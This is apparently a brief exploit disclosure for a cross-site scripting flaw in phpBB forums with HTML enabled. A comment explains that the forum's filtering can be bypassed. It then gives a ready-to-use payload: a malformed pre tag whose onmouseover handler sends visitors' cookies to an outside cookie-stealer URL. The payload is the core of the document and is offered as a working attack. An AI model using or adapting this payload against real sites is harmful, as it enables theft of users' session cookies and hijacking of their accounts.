/*
As long as html is ON in the latest version of phpBB forums, 
several XSS attack vectors are possible. phpBB incorrectly 
filters in both messages and profiles, making cookie stealing, 
and other XSS attacks possible. the exploit leads to arbitary 
javascript execution, which in turn can lead to html defacement.

use of the &lt;pre&gt; tag means that the cursor must pass it in the y 
direction only. e.g. the mouse only needs to cross a point 
horrizontaly equal to the link in order for the javascript to be executed.

the following is a simple attack:
*/

&lt;pre a='&gt;' onmouseover='document.location=&quot;http://www.milw0rm.com/cookie_stealer.php?c=&quot;+document.cookie' b='&lt;pre' &gt;
